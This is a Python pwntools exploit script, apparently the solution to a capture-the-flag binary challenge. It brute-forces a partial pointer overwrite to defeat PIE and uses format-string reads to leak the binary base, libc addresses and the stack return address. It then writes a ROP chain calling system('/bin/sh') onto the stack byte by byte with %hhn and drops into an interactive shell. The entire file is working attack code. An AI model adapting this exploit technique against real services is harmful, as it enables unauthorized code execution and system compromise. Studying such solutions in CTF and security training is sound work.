from pwn import *

context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("chall")
libc = ELF("libc.so.6")	# we can extract the libc from the docker container

p = None
def start():
	global p
	with context.local(log_level="ERROR"):
		if p:
			p.close()
		if args.REMOTE:
			p = remote("127.0.0.1", 5000)
		else:
			p = elf.process(env={"LD_LIBRARY_PATH": "."})	# use the same libc as docker
			# p = elf.process(aslr = False, env={"LD_LIBRARY_PATH": "."})

# gdb.attach(p, gdbscript = "b *(main + 195)")
# pause()

def edit_text(text):
	p.readuntil("> ")
	p.sendline(b"1")
	p.readuntil(": ")
	p.send(text)

def save_text():
	p.readuntil("> ")
	p.sendline(b"2")

def trigger_printf():
	p.readuntil("> ")
	p.sendline(b"0")

# make the `error_string` pointer point into the text buffer we control with a partial overwrite.
# 1/16 bruteforce because of PIE.
for tries in range(100):
	log.info("try #%d" % (tries + 1))
	start()
	fmt = b"A" * 255 + b"|"
	edit_text(fmt + p16(0x8020))
	trigger_printf()
	try:
		resp = p.readuntil(b"|", timeout=1)
		if resp: break
	except EOFError:
		pass

# leak the currently changed `error_string` to find binary base
base = u64(p.recv(6) + b"\0\0") - 0x4020
print("binary base =", hex(base))

# write a format string payload to leak several libc addresses
fmt = b"|%26$s|%27$s|%6$p|"
fmt = fmt.ljust(128, b"A")
fmt += p64(base + elf.got["printf"])
fmt += p64(base + elf.got["puts"])
edit_text(fmt)
save_text()
trigger_printf()

p.readuntil("|")
printf_libc = u64(p.readuntil("|")[:-1].ljust(8, b"\0"))
print("printf@libc =", hex(printf_libc))
puts_libc = u64(p.readuntil("|")[:-1].ljust(8, b"\0"))
print("puts@libc =", hex(puts_libc))
libc.address = printf_libc - libc.sym["printf"]
print("libc_base =", hex(libc.address))

# leak the location of main() return address on the stack
main_ret = int(p.readuntil("|")[:-1], 16) + 8
print("main ret addr stored at: ", hex(main_ret))

# write 1 byte to an arbitrary location with format string
def fmt_write(what, where):
	fmt = b"%" + str(what).encode("utf-8") + b"c"
	if (what == 0):
		fmt = b""
	fmt += b"%26$hhn"
	fmt = fmt.ljust(128, b"A")
	fmt += p64(where)
	edit_text(fmt)
	save_text()
	trigger_printf()

rop = p64(base + 0x1411)	# `ret` to align the stack for system()
rop += p64(libc.address + 0x2a3e5)	# pop rdi
rop += p64(next(libc.search(b"/bin/sh\0")))
rop += p64(libc.sym["system"])

# write a ROP payload on the stack with format string
for i in range(len(rop)):
	fmt_write(rop[i], main_ret + i)

p.readuntil("> ")
p.sendline(b"3")

p.interactive()
